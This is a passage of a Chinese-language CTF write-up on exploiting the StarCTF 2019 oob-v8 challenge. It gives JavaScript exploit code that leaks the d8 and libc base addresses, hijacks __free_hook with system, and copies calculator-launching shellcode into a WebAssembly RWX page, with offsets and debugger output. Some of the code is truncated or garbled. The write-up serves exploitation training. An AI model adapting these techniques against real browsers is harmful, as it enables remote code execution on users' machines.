如何劫持free_hook呢？首先要泄露d8模块基址。这里笔者采用的是《从一道CTF题零基础学V8漏洞利用》这篇文章中介绍的稳定泄露的方法，具体步骤读者可以参考那篇文章：  
var a = [1.1, 2.2, 3.3];  
var code_addr = read64(addressOf(a.constructor) + 0x30n);  
var leak_d8_addr = read64(code_addr + 0x41n);  
console.log("[*] find libc leak_d8_addr: 0x" + hex(leak_d8_addr));  
上述代码泄露了d8模块里面的一个指针，接着需要根据该指针计算得到d8模块的基址，作为一个初学者，笔者在实践的过程中，发现所有文章都对这一步骤一笔带过，这里简述笔者采用的方法：  
先按照《从一道CTF题零基础学V8漏洞利用》的方法在调试器中进行查找，某次定位到leakd8addr为0x561083f56780，用vmap命令显示该地址的相关信息，输出中最前面有一个0x561083607000，这个函数即为d8模块的_start函数在内存中的地址：  
pwndbg> vmmap 0x561083f56780  
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
0x561083607000 0x5610841df000 r-xp bd8000 642000
/home/test/v8/out.gn/x64.release/d8  
通过以下步骤即可计算得到d8基址：
  3. 计算在内存中leakd8addr相对于_start的偏移，记为offset1
  4. 在IDA中计算得到_start相对于d8基址的偏移，记为offset2
  5. d8基址 = leakd8addr - offset1 - offset2  
下面为笔者某次实践中对应的相关偏移，及相关计算过程：  
// _start 0x561083607000  
// leak_d8_addr = 0x561083f56780  
// leak_d8_addr - _start = ‭0x94F780‬  
// _start - leak_d8_addr = 0x642000  
// leak_d8_addr - base = 0x642000 + 94F780 = 0xF91780  
var d8_base_addr = leak_d8_addr - 0xF91780n;  
console.log("[*] d8_base_addr: 0x" + hex(d8_base_addr));  
泄露得到d8模块基址后，先在d8模块中定位_start函数，找到该函数中使用的_libcstartmainptr函数指针：  
// 由d8的导出表定位到_start函数  
.text:0000000000642000 public _start  
.text:0000000000642000 _start proc near  
.text:0000000000642000 ; **unwind {  
.text:0000000000642000 31 ED xor ebp, ebp  
.text:0000000000642002 49 89 D1 mov r9, rdx ; rtld_fini  
.text:0000000000642005 5E pop rsi ; argc  
.text:0000000000642006 48 89 E2 mov rdx, rsp ; ubp_av  
.text:0000000000642009 48 83 E4 F0 and rsp, 0FFFFFFFFFFFFFFF0h  
.text:000000000064200D 50 push rax  
.text:000000000064200E 54 push rsp ; stack_end  
.text:000000000064200F 4C 8D 05 2A 6A BD+lea r8, **libc_csu_fini ; fini  
.text:0000000000642016 48 8D 0D B3 69 BD+lea rcx, **libc_csu_init ; init  
.text:000000000064201D 48 8D 3D 6C 2F 01+lea rdi, main ; main  
.text:0000000000642024 FF 15 76 B7 C2 00 call cs:**libc_start_main_ptr  
.text:000000000064202A F4 hlt  
.text:000000000064202A ; } // starts at 642000  
.text:000000000064202A _start endp
// 由上面的函数指针定位到got表中的相关项  
.got:000000000126D7A0 **libc_start_main_ptr dq offset** libc_start_main  
.got:000000000126D7A0 ; DATA XREF: _start+24↑r  
得到d8基址和
**libc_start_main的offset后，就可以在代码中读取内存中的libcstartmainaddr函数地址，接着通过IDA计算得到libcstartmain相对于libc-2.27.so基地址的偏移，这样我们就可计算得到libc库在内存中的基址。随后在其导出表查找freehook、system这两个函数的偏移，并加上libc在内存中的基址，就可得到free_hook、system两个函数在内存中的地址。  
// **libc_start_main_ptr in d8  
var d8_got_libc_start_main_addr = d8_base_addr + 0x126d7a0n;  
var libc_start_main_addr = read64(d8_got_libc_start_main_addr);  
console.log("[*] find libc_start_main_addr: 0x" + hex(libc_start_main_addr));
var libc_base_addr = libc_start_main_addr - 0x21AB0n;  
var lib_system_addr = libc_base_addr + 0x4F440n;  
var libc_free_hook_addr = libc_base_addr + 0x3ED8E8n;
console.log("[ _] find libc libc_base_addr: 0x" + hex(libc_base_addr));  
console.log("[_] find libc lib_system_addr: 0x" + hex(lib_system_addr));  
console.log("[*] find libc libc_free_hook_addr: 0x" +
hex(libc_free_hook_addr));  
找到上述信息后，理论上借助任意地址写原语将free_hook的地址修改为system的地址即可，但实践时发现write64这个原语无法正确完成写入，多篇分析文章已就这个问题进行讨论，解决办法是再借助DataView对象封装另一个任意地址写原语：  
var data_buf = new ArrayBuffer(8);  
var data_view = new DataView(data_buf);  
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;
function write64_dataview(addr, data)  
{  
write64(buf_backing_store_addr, addr);  
data_view.setFloat64(0, i2f(data), true);  
console.log("[ _] write(use dataview) to: 0x" + hex(addr) + ": 0x" +
hex(data));  
}  
此时就可以劫持free_hook并实现代码执行了：  
write64_dataview(libc_free_hook_addr, lib_system_addr);  
console.log("[_] Write ok.");  
console.log("gnome-calculator");  
效果如下：
代码执行：wasm  
相比较之前的方法，wasm方法只需要很少的硬编码，也无需借助DataView再构造一个写原语，许多Writeup中已经对该种方法进行详细说明，本文不再过多叙述：  
ar wasmCode = new Uint8Array([略]);  
var wasmModule = new WebAssembly.Module(wasmCode);  
var wasmInstance = new WebAssembly.Instance(wasmModule, {});  
var f = wasmInstance.exports.main;  
var f_addr = addressOf(f);
console.log("[*] leak wasm func addr: 0x" + hex(f_addr));
var shared_info_addr = read64(f_addr + 0x18n) - 1n;  
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x08n) - 1n;  
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 1n;  
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));
function copy_shellcode(addr, shellcode)  
{  
let buf = new ArrayBuffer(0x100);  
let dataview = new DataView(buf);  
let buf_addr = addressOf(buf);  
let backing_store_addr = buf_addr + 0x20n;
    write64(backing_store_addr, addr);
    for(let i = 0; i   
var shellcode = [  
0x90909090,  
0x90909090,  
0x782fb848,  
0x636c6163,  
0x48500000,  
0x73752fb8,  
0x69622f72,  
0x8948506e,  
0xc03148e7,  
0x89485750,  
0xd23148e6,  
0x3ac0c748,  
0x50000030,  
0x4944b848,  
0x414c5053,  
0x48503d59,  
0x3148e289,  
0x485250c0,  
0xc748e289,  
0x00003bc0,  
0x050f00  
];
console.log("[ _] Copying xcalc shellcode to RWX page");  
copy_shellcode(rwx_page_addr, shellcode);  
console.log("[_] Popping calc");  
f();  
对上述代码中的shellcode注解如下：
这种方法可以更为简单地实现代码执行，效果如下：
Chrome下的代码执行  
题目原材料中给了一个对应的Chrome程序，写一个index.html脚本调用上述rce_wasm.js文件，以--no-sandbox模式启动该Chrome，打开index.html，即可在Chrome中实现代码执行：
写在最后  
借助本次实践，笔者初步上手了Linux下v8的漏洞调试，包括源码下载、环境搭建、漏洞成因调试和漏洞利用编写，以及对gdb、pwndbg下相关调试指令的熟悉。近年来各大CTF中与v8有关的题目越来越多，网上的学习资料也开始增多，希望此文对读者上手该领域也有一定帮助。  
参考资料  
主要参考：  
题目资料下载  
官方Writeup材料  
v8 Base  
从一道CTF题零基础学V8漏洞利用  
StarCTF 2019 ( _CTF) oob 初探V8漏洞利用  
其他资料：  
Chrome v8 exploit - OOB_CTF2019 OOB-v8 Writeup  
star ctf Chrome oob Writeup  
_CTF 2019 – Chrome oob-v8  
v8利用入门：从越界访问到RCE  
Exploiting v8: _CTF 2019 oob-v8